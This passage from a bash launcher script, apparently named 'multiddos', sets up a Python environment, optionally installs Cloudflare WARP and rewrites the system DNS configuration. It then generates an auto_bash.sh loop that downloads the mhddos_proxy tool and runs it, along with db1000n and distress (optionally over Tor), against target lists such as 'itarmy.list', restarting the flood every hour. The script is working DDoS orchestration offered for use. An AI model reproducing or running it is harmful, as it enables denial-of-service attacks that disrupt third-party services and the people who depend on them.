    if [[ "$venv_output" == "venv failed!" ]]; then
        have_venv=$(
            python3 - <<EOF
try:
    import virtualenv;
    print("virtualenv found!")
except Exception:
    print("virtualenv failed!")
EOF
        )
        if [[ $have_venv == "virtualenv failed!" ]]; then
            python3 -m pip install virtualenv >/dev/null 2>&1
        fi
        export py_venv="python3 -m virtualenv"
        $py_venv "$script_path/venv" >/dev/null 2>&1 || export venv_output="fail"
    fi
    if [[ $venv_output == "fail" ]]; then
        printf "%s\n%s\n" "$str_venv_failed" "$str_fallback_ita"
        export $opt_open_mhddos="off"
        return 0
    fi
}
export -f venv_prepare
###############################################################################
#
###############################################################################
function cf_warp() {
    cf_good_to_go="false"
    cf_installed="false"
    if command -v warp-cli >/dev/null 2>&1; then
        cf_installed="true"
        cf_good_to_go="true"
    fi
    if [[ "$opt_cloudflare" == "on" ]]; then
        sudo cp /etc/resolv.conf "$script_path/resolv.conf.backup"
        printf "%s cloudflare-warp... " "$str_probing"
        if [[ ("$cf_installed" == "false") && ("$os_bits" == 64) ]]; then
            if [[ "$os_dist" == "CentOS" || $os_dist == "centos" ]]; then
                if [[ "$os_version_major" == "8" ]]; then
                    cf_good_to_go="true"
                    sudo rpm -ivh "$link_cf_centos8"
                    sudo yum update
                    sudo yum -y install cloudflare-warp
                    yes | warp-cli register || true
                else
                    cf_good_to_go="false"
                fi
            elif [[ "$os_dist" == "Ubuntu" && $os_version_major -ge 16 ]]; then
                cf_good_to_go="true"
                local gpg="/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"
                curl -s https://pkg.cloudflareclient.com/pubkey.gpg |
                    sudo gpg --yes --dearmor --output $gpg
                echo "deb [arch=amd64 signed-by=$gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" |
                    sudo tee /etc/apt/sources.list.d/cloudflare-client.list
                sudo apt update
                sudo apt -y install cloudflare-warp
                yes | warp-cli register || true
            elif [[ "$os_dist" == "Debian" && $os_version_major -ge 9 ]]; then
                cf_good_to_go="true"
                local gpg="/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"
                curl -s https://pkg.cloudflareclient.com/pubkey.gpg |
                    sudo gpg --yes --dearmor --output $gpg
                echo "deb [arch=amd64 signed-by=$gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" |
                    sudo tee /etc/apt/sources.list.d/cloudflare-client.list
                sudo apt update
                sudo apt -y install cloudflare-warp
                yes | warp-cli register || true
            else
                cf_good_to_go="false"
            fi
        fi
        if ! command -v warp-cli >/dev/null 2>&1; then
            cf_good_to_go="false"
        fi
        if [[ "$cf_good_to_go" == "true" ]]; then
            printf "%s\n" "$str_found"
        else
            print_error "$str_cf_no_go\n"
            opt_cloudflare="off"
        fi
    fi
}
export -f cf_warp
###############################################################################
#
###############################################################################
function check_internet() {
    cat </dev/null >/dev/tcp/8.8.8.8/53
    local online=$?
    if [[ $online -eq 0 ]]; then
        return 0
    else
        return 1
    fi
}
export -f check_internet
###############################################################################
#
###############################################################################
function check_dns() {
    curl -Is http://www.google.com | head -1 | grep 200 >/dev/null 2>&1
    local result=$?
    if [ $result -eq 0 ]; then
        return 0
    else
        return 1
    fi
}
export -f check_dns
###############################################################################
#
###############################################################################
function restore_dns() {
    wait_for_internet
    if check_dns; then
        return 0
    else
        cat >"$script_path/resolv.conf" <<'EOF'
# This file was generated by multiddos
nameserver 127.0.2.2
nameserver 127.0.2.3
nameserver 8.8.8.8
nameserver 8.8.4.4
nameserver 50.230.4.242
nameserver 104.244.141.140
nameserver 98.232.103.4
nameserver 23.28.169.42
nameserver 24.60.77.38
nameserver 50.217.217.126
nameserver 98.238.242.50
nameserver 209.242.60.162
nameserver 73.222.26.229
nameserver 73.4.55.103
nameserver 172.74.55.84
nameserver 70.191.183.15
nameserver fd01:db8:1111::2
nameserver fd01:db8:1111::3
search .
options edns0
options trust-ad
EOF
        if [[ $script_is_root == "true" ]]; then
            cp "$script_path/resolv.conf" /etc/resolv.conf
        elif [[ $script_have_sudo == "true" ]]; then
            sudo cp "$script_path/resolv.conf" /etc/resolv.conf
        else
            true
        fi
    fi
}
export -f restore_dns
###############################################################################
#
###############################################################################
function wait_for_internet {
    check_internet
    local have_internet=$?
    # minute=0
    while [[ ! $have_internet ]]; do
        sleep $((1 + RANDOM % 10))
        have_internet=$(check_internet)
        if [[ ! $have_internet ]]; then
            true
            # TODO: Some message, maybe?
        fi
    done
}
export -f wait_for_internet
###############################################################################
#
###############################################################################
function create_autobash() {
    cat >"$script_path/auto_bash.sh" <<'EOF'
#!/bin/bash
if [[ $opt_debug == "on" ]]; then
    set -x
fi
runner="$script_path/mhddos_proxy/runner.py"
if [[ $opt_cloudflare == "on" ]]; then
    warp-cli connect >/dev/null 2>&1
    sleep 15s
fi

# Restart and update mhddos_proxy and targets every N minutes
while true; do
    #install mhddos_proxy
    cd "$script_path" || return
    if [[ $opt_getting_targets == "on" ]]; then
        get_targets
    fi

    script_banner=$(curl -s --retry 10 -L --url "$link_banner") >/dev/null 2>&1
    printf "%s\n" "$script_banner"
    ########################################################################################
    if [[ $opt_open_mhddos == "on" ]]; then
        rm -rf "$script_path/mhddos_proxy" >/dev/null 2>&1
        while [[ ! -d "$script_path/mhddos_proxy" ]]; do
            get_mhddos_proxy
        done
        cd "$script_path/mhddos_proxy" || return
        # shellcheck disable=1091
        source "$script_path/venv/bin/activate"
        python3 -m pip install --upgrade pip >/dev/null 2>&1
        if [[ $opt_skip_dependencies == "on" ]]; then
            skip_dependencies
            python3 -m pip install -r "$script_path/mhddos_proxy/new_req.txt" >/dev/null 2>&1
        else
            python3 -m pip install -r "$script_path/mhddos_proxy/requirements.txt" >/dev/null 2>&1
        fi
        if [[ "$opt_type" == "normal" ]]; then
            python3 "$runner" -c "$script_path/targets/itarmy.list" $args_to_pass &
        elif [[ "$opt_type" == "full" ]]; then
            python3 "$runner" -c "$script_path/targets/uniq_targets.txt" $args_to_pass &
        elif [[ "$opt_type" == "enormous" ]]; then
            python3 "$runner" -c "$script_path/targets/uniq_targets.txt" $args_to_pass &
            sleep 30
            python3 "$runner" -c "$script_path/targets/uniq_targets.txt" $args_to_pass &
        fi
    elif [[ -f "$script_path/bin/ita" ]]; then
        cd "$script_path/bin/" || return
        ./ita &
        cd "$script_path" || return
    fi
    ########################################################################################
    if [[ $opt_db1000n == "on" ]]; then
        $script_db1000n &
    fi
    ########################################################################################
    if [[ $opt_distress == "on" ]]; then
        cd "$script_path/bin/" || return
        if [[ $opt_distress_usetor == "on" ]]; then
            $script_distress --use-tor 50 &
        elif [[ $opt_distress_myip == "on" ]]; then
            $script_distress --use-my-ip 100 &
        else
            $script_distress &
        fi
        cd "$script_path" || return
    fi
    ########################################################################################
    minute=0
    still_alive=0
    wait_min=60
    while [[ $minute -lt $wait_min ]]; do
        sleep 1m
        wait_for_internet
        minute=$((minute + 1))
        still_alive=$(proc_check "$runner")
        if [[ $still_alive == 0 ]]; then
            break
        fi
    done
    ########################################################################################
    if [[ $opt_open_mhddos == "on" ]]; then
        pkill -f "$runner"
    elif [[ -f "$script_path/bin/ita" ]]; then
        pkill -f "$script_path/bin/ita"
    fi
    ########################################################################################
    if [[ $opt_distress == "on" ]]; then
        pkill -f "$script_distress"
    fi
    ########################################################################################
    if [[ $opt_db1000n == "on" ]]; then
        pkill -f "$script_db1000n"
    fi
    ########################################################################################
    if [[ $opt_open_mhddos == "on" ]]; then
        deactivate
    fi
done
EOF
}
###############################################################################
#
###############################################################################
trap cleanup INT
main "$@"
exit
